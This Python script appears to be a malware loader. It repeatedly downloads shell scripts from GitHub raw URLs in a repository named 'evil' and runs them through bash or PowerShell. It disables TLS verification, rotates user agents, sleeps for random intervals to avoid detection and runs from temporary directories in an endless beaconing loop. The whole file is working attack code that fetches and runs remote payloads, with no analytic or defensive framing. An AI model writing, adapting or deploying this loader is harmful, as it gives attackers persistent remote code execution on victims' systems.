import subprocess, time, urllib.request, ssl, random, os, platform

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X)',
    'curl/7.68.0',
    'Wget/1.20.3'
]

URL_SOURCES = [
    "https://raw.githubusercontent.com/mimikr00t/evil/main/payload.sh",
    "https://raw.githubusercontent.com/mimikr00t/evil/main/payload.txt"
]

def create_ssl_context():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def stealth_download(url):
    time.sleep(random.uniform(1, 5))
    req = urllib.request.Request(url, headers={'User-Agent': random.choice(USER_AGENTS)})
    with urllib.request.urlopen(req, context=create_ssl_context(), timeout=30) as res:
        return res.read().decode('utf-8')

def obfuscated_execute(script, name):
    time.sleep(random.uniform(2, 10))
    if platform.system().lower() == "windows":
        subprocess.run(["powershell", "-Command", script], capture_output=True, text=True)
    else:
        subprocess.run(["bash", "-c", script], capture_output=True, text=True)

def change_working_directory():
    for d in ["/tmp", "/var/tmp", os.path.expanduser("~/.cache")]:
        if os.path.exists(d):
            os.chdir(d)
            break

def process_scripts_stealth():
    for url in URL_SOURCES:
        script = stealth_download(url)
        if script and script.strip():
            obfuscated_execute(script, url.split('/')[-1])

def main_loop():
    iteration = 0
    while True:
        iteration += 1
        process_scripts_stealth()
        if iteration % 10 == 0:
            print(f"[{time.strftime('%H:%M:%S')}] Cycle {iteration} complete.")
        time.sleep(max(60, random.randint(1800, 7200) + random.randint(-300, 300)))

if __name__ == "__main__":
    change_working_directory()
    main_loop()
